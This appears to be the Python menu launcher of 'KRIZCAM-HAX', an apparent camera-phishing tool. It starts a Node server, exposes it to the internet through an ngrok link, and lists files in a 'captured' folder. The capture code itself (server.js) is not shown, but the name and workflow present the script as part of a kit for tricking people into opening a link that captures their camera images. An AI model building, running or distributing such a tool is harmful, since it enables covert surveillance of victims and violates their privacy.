import os
import subprocess

def start_server():
    os.system("node server.js")

def generate_ngrok():
    print("[*] Starting Ngrok...")
    os.system("ngrok http 3000")

def view_captures():
    print("\n--- Captured Files ---")
    os.system("ls captured")

def main():
    while True:
        print("""
╔════════════════════════════════════╗
║        KRIZCAM-HAX - Python UI    ║
║   Developed by AnanthKriz x Nicole║
╚════════════════════════════════════╝
[1] Start Server
[2] Generate Ngrok Link
[3] View Captures
[4] Exit
        """)
        choice = input("Enter your choice: ")
        if choice == '1':
            start_server()
        elif choice == '2':
            generate_ngrok()
        elif choice == '3':
            view_captures()
        elif choice == '4':
            break
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
